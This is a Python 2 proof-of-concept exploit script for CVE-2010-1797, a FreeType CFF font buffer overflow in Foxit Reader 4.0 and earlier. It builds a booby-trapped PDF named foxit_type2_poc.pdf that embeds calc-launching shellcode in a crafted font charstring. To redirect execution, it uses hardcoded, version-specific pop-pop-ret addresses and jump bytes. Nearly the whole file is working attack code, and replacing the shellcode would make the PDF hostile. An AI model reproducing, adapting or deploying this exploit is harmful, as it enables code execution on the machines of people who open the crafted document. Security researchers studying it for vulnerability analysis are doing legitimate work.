import sys,zlib

def getFFShellcode(sc):
   ff_sc = ''
   if len(sc)%4 != 0:
      sc += (4-len(sc)%4)*'\x00' 
   for i in range(0,len(sc),4):
      ff_sc += '\xff'+sc[i+3]+sc[i+2]+sc[i+1]+sc[i]
   return ff_sc 

outputHeader = '''
##############################################################################################
# FreeType Compact Font Format (CFF) Multiple Stack Based Buffer Overflow (CVE-2010-1797)    #
##############################################################################################
#                                                                                            #
# Product: Foxit Reader <= 4.0                                                               #
# Platforms: Windows XP, Windows Vista                                                       #
# Author: Jose Miguel Esparza <jesparza AT eternal-todo DOT com>                             #
# Web: http://eternal-todo.com                                                               #
# Date: 2010-08-23                                                                           #
#                                                                                            #
##############################################################################################
'''
outputFileName = 'foxit_type2_poc.pdf'
usage = 'Usage: '+sys.argv[0]+' target\n\nTargets:\n\t0 - Foxit Reader > 3.0\n\t1 - Foxit Reader 3.0\n\t2 - Other versions'

COMEX_PDF_TEMPLATE = '''%PDF-1.3
%\xbe\xbe\xba\xba
4 0 obj 
<< /Length 631 >>
stream
q Q q 18 750 576 24 re W n /Cs1 cs 0 0 0 sc q 1 0 0 -1 0 0 cm BT 0.0003 Tc
7 0 0 -7 534.7051 -768 Tm /F2.0 1 Tf [ (4/15/10 8:01 P) 1 (M) ] TJ ET Q q 
1 0 0 -1 0 0 cm BT 7 0 0 -7 18 -768 Tm /F2.0 1 Tf [ (d) -0.4 (a) -0.2 (ta)
-0.2 (:) -0.4 (te) -0.1 (x) -0.3 (t/) -0.4 (h) 0.4 (tm) 0.4 (l) -0.1 (,) -0.4
( ) ] TJ ET Q Q q 18 40 576 24 re W n /Cs1 cs 0 0 0 sc q 1 0 0 -1 0 0 cm BT
-0.0003 Tc 7 0 0 -7 555.6299 -43 Tm /F2.0 1 Tf [ (Pa) -1 (ge ) -1 (1) -1 ( ) 
-1 (o) -1 (f ) -1 (1) ] TJ ET Q Q q 18 190 576 560 re W n /Cs1 cs 1 1 1 sc
18 190 576 560 re f 0 0 0 sc q 0.8 0 0 -0.8 18 750 cm BT 16 0 0 -16 8 22 Tm
/F2.0 1 Tf ( ) Tj ET Q Q 
endstream
endobj
2 0 obj 
<< /Type /Page /Parent 3 0 R /Resources 5 0 R /Contents 4 0 R /MediaBox [0 0 612 792]
>>
endobj
5 0 obj 
<< /ProcSet [ /PDF /Text ] /ColorSpace << /Cs1 6 0 R >> /Font << /F2.0 8 0 R >> >>
endobj
3 0 obj 
<< /Type /Pages /MediaBox [0 0 612 792] /Count 1 /Kids [ 2 0 R ] >>
endobj
7 0 obj 
<< /Type /Catalog /Pages 3 0 R >>
endobj
11 0 obj 
<<
/Subtype/Type1C
/Filter[/FlateDecode]
/Length $CFF_STREAM_LENGTH
>>
stream
$CFF_STREAM
endstream
endobj
9 0 obj
<< /Type /FontDescriptor /Ascent 750 /CapHeight 676 /Descent -250 /Flags 32
/FontBBox [-203 -428 1700 1272] /FontName /CSDIZD+Times-Roman /ItalicAngle
0 /StemV 0 /MaxWidth 1721 /XHeight 461 /FontFile3 11 0 R >>
endobj
10 0 obj
[ 556 ]
endobj
8 0 obj
<< /Type /Font /Subtype /Type1 /BaseFont /CSDIZD+Times-Roman /FontDescriptor
9 0 R /Widths 10 0 R /FirstChar 32 /LastChar 32 /Encoding /MacRomanEncoding
>>
endobj
1 0 obj
<< >>
endobj
xref
0 12
0000000000 65535 f
0000017767 00000 n
0000000408 00000 n
0000003397 00000 n
0000000022 00000 n
0000000389 00000 n
0000000512 00000 n
0000003361 00000 n
0000017359 00000 n
0000007240 00000 n
0000000622 00000 n
0000003340 00000 n
trailer
<< /Size 12 /Root 7 0 R /Info 1 0 R >>
startxref
17942
%%EOF
'''

MAX_FF_SECTION_LEN = 45*5
JUMP_BYTE = ['\xcd','\xcc']
POP_POP_RET_ADDRESS = ['\x00\x40\x11\x85','\x00\x40\xce\x36'] # Foxit reader addresses, depending on the version
NUM_SECOND_INSTRUCTIONS_SET = [183,182]

# calc.exe shellcode
shellcode = '\x68\x10\xf5\x00\x00\x31\xf6\x64\x8b\x76\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x6e\x08\x8b\x36\x8b\x5d\x3c\x8b\x5c\x1d\x78\x01\xeb\x8b\x4b\x18\x67\xe3\xec\x8b\x7b\x20\x01\xef\x8b\x7c\x8f\xfc\x01\xef\x31\xc0\x99\x32\x17\x66\xc1\xca\x01\xae\x75\xf7\x58\x66\x3b\xd0\x50\xe0\xe2\x75\xcc\x8b\x53\x24\x01\xea\x0f\xb7\x14\x4a\x8b\x7b\x1c\x01\xef\x03\x2c\x97\x66\x3d\x10\xf5\x75\x0e\x33\xc0\x50\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x54\xff\xd5\x68\x06\xcb\x00\x00\xeb\x92'

cff_header = '\x01\x00\x04\x01\x00\x01\x01\x01\x13ABCDEF+Times-Roman\x00\x01\x01\x01\x1f\xf8\x1b\x00\xf8\x1c\x02\xf8\x1d\x03\xf8\x19\x04\x1co\x00\r\xfb<\xfbn\xfa|\xfa\x16\x05\xe9\x11\x8b\x8b\x12\x00\x03\x01\x01\x08\x13\x18001.007Times RomanTimes\x00\x00\x00\x02\x04\x00\x00\x00\x01\x00\x00\x00\x05\x00\x00\x04\xdc'

if len(sys.argv) > 2 or (len(sys.argv) == 2 and not sys.argv[1].isdigit()) or len(sys.argv) == 1:
   sys.exit(usage)

version = int(sys.argv[1])
if version == 2:
   sys.exit('Versions < 3.0 are not implemented, try it!! ;)\n')
if version > 2:
   sys.exit(usage)

print outputHeader
print '[-] Creating PDF file...'
# Building the FF section
ff_shellcode = getFFShellcode(shellcode)
ff_zero_bytes = '\xff\x00\x00\x00\x00'
ff_instructions = ff_zero_bytes*11 + ff_shellcode + ((MAX_FF_SECTION_LEN - len(ff_shellcode) - 55 - 5*5)/5) * ff_zero_bytes + '\xff\x90\x90\x8a\xeb' + '\xff'+POP_POP_RET_ADDRESS[version] + ('\xff\x00'+JUMP_BYTE[version]+'\x00\x00')*3 
if len(ff_instructions) > MAX_FF_SECTION_LEN:
   sys.exit('[x] FF section bigger than expected!!')

# Operators sections
first_instructions_set = '\x0c\x17\x0c\x17\x0c\x04\x0c\x1d' * 20
second_instructions_set = '\x0c\x17\x0c\x1d' * NUM_SECOND_INSTRUCTIONS_SET[version]
third_instructions_set = '\x0c\x1d\x0c\x12' * 42

# Building the full CFF content for the fake charstring
cff_content = cff_header + '\x0e'*4 + ff_instructions + first_instructions_set + second_instructions_set + third_instructions_set + ff_zero_bytes + '\x0e'
# Decoding with FlateDecode
encoded_cff_content = zlib.compress(cff_content)

# Creating the PDF based on the Comex PDF, slightly modified
pdf_content = COMEX_PDF_TEMPLATE
pdf_content = pdf_content.replace('$CFF_STREAM_LENGTH',str(len(encoded_cff_content)))
pdf_content = pdf_content.replace('$CFF_STREAM',encoded_cff_content)
open(outputFileName,'w').write(pdf_content)
print '[+] File "'+outputFileName+'" created, test it!!'
